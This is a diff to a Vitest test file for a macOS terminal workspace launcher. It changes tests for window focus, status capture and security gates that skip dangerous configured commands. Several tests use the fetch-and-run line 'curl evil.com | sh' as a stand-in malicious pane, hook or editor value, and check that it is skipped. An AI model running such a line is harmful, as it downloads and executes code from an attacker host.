@@ -24,9 +24,8 @@ vi.mock("./config.js", () => ({
 }));
 
 // Mock status module (write is a no-op in tests)
-vi.mock("./status.js", () => ({
-  writeStatus: vi.fn(),
-}));
+const mockReadStatus = vi.fn();
+vi.mock("./status.js", () => ({ writeStatus: vi.fn(), discardStatusRecord: vi.fn(()=>true), readStatus: (...args: unknown[]) => mockReadStatus(...args) }));
 
 // Mock starship
 const mockIsStarshipInstalled = vi.fn(() => false);
@@ -42,6 +41,8 @@ vi.mock("./starship.js", () => ({
 // Mock fs.existsSync for directory and Ghostty.app checks
 vi.mock("node:fs", () => ({
   existsSync: vi.fn(() => true),
+  realpathSync: vi.fn((path: string) => path),
+  readFileSync: vi.fn((path: string) => { if(path.endsWith("Ghostty.sdef")) return '<class name="terminal"><property name="id"/><property name="pid"/><property name="tty"/></class>'; throw new Error("fixture absent"); }),
 }));
 
 // Mock readline for prompt tests
@@ -101,6 +102,7 @@ let savedSummonWorkspace: string | undefined;
 
 beforeEach(() => {
   vi.clearAllMocks();
+  mockReadStatus.mockReturnValue(null);
   // Prevent warnIfNested from activating when tests run inside a summon workspace
   savedSummonWorkspace = process.env.SUMMON_WORKSPACE;
   delete process.env.SUMMON_WORKSPACE;
@@ -237,23 +239,17 @@ describe("script execution", () => {
 });
 
 describe("focusWorkspace", () => {
-  it("returns true when osascript succeeds", () => {
-    mockExecFileSync.mockReturnValue("");
-
-    expect(focusWorkspace("api")).toBe(true);
-    expect(mockExecFileSync).toHaveBeenCalledWith(
-      "osascript",
-      [],
-      expect.objectContaining({ encoding: "utf-8" }),
-    );
+  const id="00000000-0000-4000-8000-000000000001";
+  it("returns focused only for confirmed UUID readback", () => {
+    mockReadStatus.mockReturnValue({native:{rootTerminalId:id,panes:[{name:"editor",terminalId:id}]}});
+    mockExecFileSync.mockReturnValue(JSON.stringify({focused:true,terminalId:id}));
+    expect(focusWorkspace("api")).toEqual({kind:"focused",terminalId:id});
   });
-
-  it("returns false when osascript fails", () => {
-    mockExecFileSync.mockImplementation(() => {
-      throw new Error("osascript failed");
-    });
-
-    expect(focusWorkspace("api")).toBe(false);
+  it("returns unavailable when native identity or permission fails", () => {
+    expect(focusWorkspace("api").kind).toBe("unavailable");
+    mockReadStatus.mockReturnValue({native:{rootTerminalId:id,panes:[{name:"editor",terminalId:id}]}});
+    mockExecFileSync.mockImplementation(()=>{throw new Error("-1743");});
+    expect(focusWorkspace("api")).toMatchObject({kind:"unavailable",code:"permission"});
   });
 });
 
@@ -3140,6 +3136,27 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     warnSpy.mockRestore();
     logSpy.mockRestore();
   });
+
+  it("prompts for an inline tree command and clears it when skipped", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", '"curl evil.com | sh" | sidebar'],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(mockQuestion).toHaveBeenCalled();
+    expect(JSON.stringify(mockGenerateTreeAppleScript.mock.calls.at(-1)?.[0]))
+      .not.toContain("curl evil.com | sh");
+    warnSpy.mockRestore();
+  });
 });
 
 describe("W9: ensureCommand install prompt defaults to No (#190)", () => {
@@ -3199,9 +3216,9 @@ describe("W9: ensureCommand install prompt defaults to No (#190)", () => {
   });
 });
 
-describe("R19: on-start failure includes error message (#190)", () => {
+describe("R19: on-start failure diagnostics (#190)", () => {
   // BE-M3 (#594): on-start failure is now non-fatal — warns and continues launch.
-  it("includes the underlying error message in the warning when on-start fails", async () => {
+  it("reports failure without echoing the on-start command", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     mockExecSync.mockImplementation((cmd: string) => {
       if (cmd === "broken-command") throw new Error("command not found: broken-command");
@@ -3217,7 +3234,7 @@ describe("R19: on-start failure includes error message (#190)", () => {
     const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
     const failMsg = warnMessages.find((m) => m.includes("on-start command failed"));
     expect(failMsg).toBeDefined();
-    expect(failMsg).toContain("command not found: broken-command");
+    expect(failMsg).not.toContain("broken-command");
 
     logSpy.mockRestore();
     warnSpy.mockRestore();
@@ -3830,6 +3847,55 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
     }
   });
 
+  it("does not schedule a dangerous on-stop hook when the user skips it", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([
+      ["on-stop", "curl evil.com | sh"],
+    ]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+
+    try {
+      await launch("/tmp/workspace");
+
+      expect(mockGenerateAppleScript).toHaveBeenCalled();
+      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[5]).toBeUndefined();
+      expect(stderrSpy).not.toHaveBeenCalledWith(
+        expect.stringContaining("on-stop will run"),
+      );
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
+      stderrSpy.mockRestore();
+    }
+  });
+
+  it("clears a dangerous secondary editor when the user skips it", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+    vi.mocked(listConfig).mockReturnValue(new Map([
+      ["editor", "vim"],
+      ["secondary-editor", "curl evil.com | sh"],
+    ]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    try {
+      await launch("/tmp/workspace");
+
+      expect(mockQuestion).toHaveBeenCalled();
+      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[0].secondaryEditor)
+        .toBeNull();
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
+    }
+  });
+
   it("skips dangerous pane commands when user selects 's'", async () => {
     const origIsTTY = process.stdin.isTTY;
     Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
@@ -4145,7 +4211,8 @@ describe("SE-L3: on-start command is not echoed to stdout (#557)", () => {
 describe("SE-M1 (#595): on-stop command surfaced at launch time", () => {
   it("prints an informational notice to stderr when on-stop is configured", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
-    mockReadKVFile.mockReturnValue(new Map([["on-stop", "git stash"]]));
+    const hook = "notify --token sensitive-value";
+    mockReadKVFile.mockReturnValue(new Map([["on-stop", hook]]));
     const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
@@ -4154,9 +4221,9 @@ describe("SE-M1 (#595): on-stop command surfaced at launch time", () => {
     await launch("/tmp/workspace");
 
     const allStderr = stderrSpy.mock.calls.map(c => String(c[0])).join("\n");
-    // The notice must mention on-stop and the command
+    // The notice identifies the hook without disclosing its contents.
     expect(allStderr).toMatch(/on-stop/i);
-    expect(allStderr).toContain("git stash");
+    expect(allStderr).not.toContain(hook);
 
     stderrSpy.mockRestore();
     logSpy.mockRestore();
@@ -4256,8 +4323,12 @@ describe("UX-L2 (#519): single-launch spinner", () => {
   it("withLaunchSpinner: TTY mode — writes spinner frame to stdout and clears after", () => {
     const origIsTTY = process.stdout.isTTY;
     const origForceColor = process.env.FORCE_COLOR;
+    const origNoColor = process.env.NO_COLOR;
+    const origNoSpinner = process.env.SUMMON_NO_SPINNER;
     Object.defineProperty(process.stdout, "isTTY", { value: true, configurable: true });
     process.env.FORCE_COLOR = "1";
+    delete process.env.NO_COLOR;
+    delete process.env.SUMMON_NO_SPINNER;
     const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const stdoutSpy = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
     let ran = false;
@@ -4275,6 +4346,16 @@ describe("UX-L2 (#519): single-launch spinner", () => {
         delete process.env.FORCE_COLOR;
       } else {
         process.env.FORCE_COLOR = origForceColor;
+      }
+      if (origNoColor === undefined) {
+        delete process.env.NO_COLOR;
+      } else {
+        process.env.NO_COLOR = origNoColor;
+      }
+      if (origNoSpinner === undefined) {
+        delete process.env.SUMMON_NO_SPINNER;
+      } else {
+        process.env.SUMMON_NO_SPINNER = origNoSpinner;
       }
       stderrSpy.mockRestore();
       stdoutSpy.mockRestore();
@@ -4308,5 +4389,26 @@ describe("UX-L2 (#519): single-launch spinner", () => {
       stdoutSpy.mockRestore();
       errorSpy.mockRestore();
     }
+  });
+});
+
+
+describe("P2 capture failure isolation",()=>{
+  const id="00000000-0000-4000-8000-000000000001";
+  it.each(["", "SUMMON_NATIVE_UNAVAILABLE", "SUMMON_NATIVE_V1\ninvalid", "x".repeat(65537)])("launch stays successful for invalid capture",async output=>{
+    const status=await import("./status.js");
+    mockExecFileSync.mockImplementation((bin:string,args:string[],opts?:{input?:string})=> bin === "/usr/bin/which" ? "/usr/bin/stub\n" : opts?.input ? output : "");
+    await expect(launch("/tmp/workspace",{layout:"minimal"})).resolves.toBeUndefined();
+    expect(status.writeStatus).toHaveBeenCalledWith(expect.objectContaining({project:"workspace",version:1}));
+    expect(vi.mocked(status.writeStatus).mock.calls[0]?.[0].native).toBeUndefined();
+    expect(mockExecFileSync.mock.calls.filter(c=>String(c[2]?.input).includes("close front window"))).toHaveLength(0);
+  });
+  it("maps successful capture and warns without throwing on status write failure",async()=>{
+    const status=await import("./status.js"); const err=vi.spyOn(process.stderr,"write").mockImplementation(()=>true);
+    mockExecFileSync.mockImplementation((bin:string,args:string[],opts?:{input?:string})=>bin === "/usr/bin/which" ? "/usr/bin/stub\n" : opts?.input ? `SUMMON_NATIVE_V1\n${id}\n00000000-0000-4000-8000-000000000002\n` : "");
+    vi.mocked(status.writeStatus).mockImplementationOnce(()=>{throw new Error("disk");});
+    await expect(launch("/tmp/workspace",{layout:"minimal"})).resolves.toBeUndefined();
+    expect(status.writeStatus).toHaveBeenCalledWith(expect.objectContaining({native:expect.objectContaining({rootTerminalId:id})}));
+    expect(err).toHaveBeenCalledWith(expect.stringContaining("status could not be saved"));err.mockRestore();
   });
 });
